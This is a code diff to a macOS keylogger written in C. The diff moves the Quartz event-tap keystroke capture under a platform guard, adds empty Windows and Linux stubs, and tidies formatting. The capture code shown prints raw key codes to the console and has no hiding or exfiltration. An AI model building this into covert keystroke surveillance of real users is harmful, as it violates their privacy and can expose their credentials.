@@ -1,9 +1,7 @@
-#include "../../include/keystroke/keylogger.h"
-
-CGEventRef eventCallback(CGEventTapProxy, CGEventType, CGEventRef, void *);
-const char *getScanCode(int);
+#include "../include/keylogger.h"
 
 void getKeyStrokes() {
+#ifdef __APPLE__
     // Defines a mask that identifies the set of Quartz events to be observed in an event tap.
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
 
@@ -29,6 +27,15 @@ void getKeyStrokes() {
 
     //Runs the current thread’s CFRunLoop object in its default mode indefinitely.
     CFRunLoopRun();
+#endif
+
+#ifdef _WIN32
+    //Implement Windows key logger logic
+#endif
+
+#ifdef linux
+    //Implement Linux key logger logic
+#endif
 }
 
 // Called when event tap mask is satisfied.
@@ -37,7 +44,7 @@ CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
     // Get virtual key code from quartz event field
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    if(type == kCGEventKeyDown) {
+    if (type == kCGEventKeyDown) {
         printf("%hu ", keyCode);
     } else {
         // TODO: Convert this from '56' (shift) for e.g. to 'Shift'
@@ -46,4 +53,3 @@ CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
 
     return event;
 }
-
